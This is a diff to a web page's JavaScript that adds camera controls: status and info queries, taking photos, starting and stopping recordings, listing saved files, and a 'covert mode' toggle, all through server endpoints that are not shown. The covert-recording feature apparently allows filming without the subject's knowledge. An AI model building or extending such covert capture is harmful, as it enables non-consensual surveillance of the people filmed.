@@ -1,13 +1,179 @@
 function updateScreenDimensions() {
     screenLabel.textContent = `Screen Dimensions: ${window.innerWidth}x${window.innerHeight}`;
 }
+
 const glow = document.getElementById('fx');
 const coordsLabel = document.getElementById('cursor-coords');
 const screenLabel = document.getElementById('screen-dimensions');
 const container = document.querySelector('.parallax-container');
 const head = document.getElementById("head");
 
+// Camera control elements
+const getCameraInfoBtn = document.getElementById('get-camera-info');
+const takePhotoBtn = document.getElementById('take-photo');
+const startRecordingBtn = document.getElementById('start-recording');
+const stopRecordingBtn = document.getElementById('stop-recording');
+const toggleCovertBtn = document.getElementById('toggle-covert');
+const cameraInfoDiv = document.getElementById('camera-info');
+const statusMessageDiv = document.getElementById('status-message');
+const capturedFilesDiv = document.getElementById('captured-files');
+
 updateScreenDimensions();
+
+// Camera control functions
+async function getCameraInfo() {
+    try {
+        const response = await axios.get('/isCameraOpen');
+        if (response.data.status === 200) {
+            const isOpen = response.data.message === 'true';
+            let infoHtml = `<h3>Camera Status</h3>`;
+            infoHtml += `<p>Camera is ${isOpen ? 'OPEN' : 'CLOSED'}</p>`;
+            if (isOpen) {
+                // Get additional camera information via a new endpoint
+                const infoResponse = await axios.get('/getCameraInfo');
+                if (infoResponse.data.status === 200) {
+                    const camInfo = infoResponse.data.message;
+                    infoHtml += `<p>Camera Index: ${camInfo.index}</p>`;
+                    infoHtml += `<p>Resolution: ${camInfo.width}x${camInfo.height}</p>`;
+                    infoHtml += `<p>FPS: ${camInfo.fps}</p>`;
+                    infoHtml += `<p>Name: ${camInfo.name}</p>`;
+                }
+            }
+            cameraInfoDiv.innerHTML = infoHtml;
+        } else {
+            showStatus('Error getting camera info', 'error');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        showStatus('Error getting camera info', 'error');
+    }
+}
+
+async function takePhoto() {
+    try {
+        const response = await axios.get('/takeFrame');
+        if (response.data.status === 200) {
+            showStatus(`Photo saved: ${response.data.message}`, 'success');
+            updateCapturedFiles();
+        } else {
+            showStatus('Error taking photo', 'error');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        showStatus('Error taking photo', 'error');
+    }
+}
+
+async function startRecording() {
+    try {
+        const filename = `static/output/recording_${Date.now()}.avi`;
+        const response = await axios.post('/startRecording', null, {
+            params: { filename: filename, fps: 30 }
+        });
+        if (response.status === 200) {
+            showStatus(response.data.message, 'success');
+        } else {
+            showStatus('Error starting recording', 'error');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        showStatus('Error starting recording', 'error');
+    }
+}
+
+async function stopRecording() {
+    try {
+        const response = await axios.get('/stopRecording');
+        if (response.data.status === 200) {
+            showStatus(response.data.message, 'success');
+            updateCapturedFiles();
+        } else {
+            showStatus(response.data.message, 'error');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        showStatus('Error stopping recording', 'error');
+    }
+}
+
+let covertModeEnabled = false;
+
+async function toggleCovertMode() {
+    try {
+        // Update button text to indicate what will happen next
+        const button = document.getElementById('toggle-covert');
+        let newMode = !covertModeEnabled;
+        
+        const response = await axios.get(`/toggleCovertMode?enable=${newMode}`);
+        if (response.data.status === 200) {
+            covertModeEnabled = newMode;
+            button.textContent = covertModeEnabled ? 'Disable Covert Mode' : 'Enable Covert Mode';
+            showStatus(response.data.message, 'success');
+        } else {
+            showStatus('Error toggling covert mode', 'error');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        showStatus('Error toggling covert mode', 'error');
+    }
+}
+
+async function updateCapturedFiles() {
+    try {
+        const response = await axios.get('/getCapturedFiles');
+        if (response.data.status === 200) {
+            const files = response.data.files;
+            let filesHtml = '<h4>Saved Files:</h4>';
+            if (files.length > 0) {
+                files.forEach(file => {
+                    filesHtml += `<div class="file-item">${file.name} (${(file.size / 1024).toFixed(2)} KB)</div>`;
+                });
+            } else {
+                filesHtml += '<div class="file-item">No files captured yet</div>';
+            }
+            capturedFilesDiv.innerHTML = filesHtml;
+        } else {
+            console.error('Error getting captured files');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+function showStatus(message, type) {
+    statusMessageDiv.textContent = message;
+    statusMessageDiv.style.backgroundColor = type === 'success' ? 'rgba(0, 255, 0, 0.2)' : 'rgba(255, 0, 0, 0.2)';
+    statusMessageDiv.style.display = 'block';
+    
+    // Hide message after 5 seconds
+    setTimeout(() => {
+        statusMessageDiv.style.display = 'none';
+    }, 5000);
+}
+
+// Event listeners for camera controls
+if (getCameraInfoBtn) {
+    getCameraInfoBtn.addEventListener('click', getCameraInfo);
+}
+
+if (takePhotoBtn) {
+    takePhotoBtn.addEventListener('click', takePhoto);
+}
+
+if (startRecordingBtn) {
+    startRecordingBtn.addEventListener('click', startRecording);
+}
+
+if (stopRecordingBtn) {
+    stopRecordingBtn.addEventListener('click', stopRecording);
+}
+
+if (toggleCovertBtn) {
+    toggleCovertBtn.addEventListener('click', toggleCovertMode);
+}
+
+// Initialize captured files display
+updateCapturedFiles();
 
 window.addEventListener('resize', updateScreenDimensions);
 
